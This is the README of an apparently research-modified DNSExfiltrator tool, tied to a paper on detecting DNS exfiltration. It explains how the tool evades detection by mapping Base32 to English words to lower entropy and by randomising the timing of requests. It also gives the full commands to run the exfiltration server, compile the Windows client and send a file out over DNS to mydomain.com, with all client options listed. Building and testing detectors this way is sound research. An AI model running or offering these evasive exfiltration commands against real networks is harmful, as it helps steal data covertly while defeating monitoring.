If you use this software for your research, please cite: Žiža, K., Tadić, P. & Vuletić, P. DNS exfiltration detection in the presence of adversarial attacks and modified exfiltrator behaviour. Int. J. Inf. Secur. (2023). https://doi.org/10.1007/s10207-023-00723-w

# Modified DNSExfiltration tool

The original tool can be found here: https://github.com/Arno0x/DNSExfiltrator.<br>
In order to make the detection of exfiltrations harder the tool was modified in the following way:
- Entropy of the requests was decreased by using a mapping we introduced (Base32map) which maps each Base32 character to 3 characters long English word. English words were chosen in such a way which gives the same distribution of characters as in regular DNS requests. The following chart shows the entropy values for different sizes of DNS requests and Base32, Base64 and our Base32map encoding.


![Capture](https://user-images.githubusercontent.com/7517033/164089826-fee9fb0e-8d1b-40f0-ae67-fc45295659c6.PNG)

- Times between requests were randomised in order to make the statistical analysis of times harder for detection tools.

## Usage

Detailed description and the instructions for using the tool can be found in its original repository.
Commands needed for testing the tool are the following:

Run the server:
`dnsexfiltrator.py -d mydomain.com -p password`

Build client for Windows:
`.\csc.exe /t:exe /out:dns.exe .\dnsExfiltrator.cs /reference:System.IO.Compression.dll`

Run client:
`.\dns.exe .\transfer.txt mydomain.com password s=192.168.192.130 -b32 r=64 l=30`

Possible arguments for running the client:
- `s = ip` - DNS server identification (IP address)
- `t = n` - throttle time in ms (fixed part)
- `tr = n` - throttle time in ms (maximum value for random part)
- `r = n` - maximum size of the request (number of characters)
- `l = n` - maximum size of the label (number of characters)
- `-b32` - inicator to use base32
- `-map` - can be used only together with `-b32` - tells the tool to use the mapping in order to reduce entropy
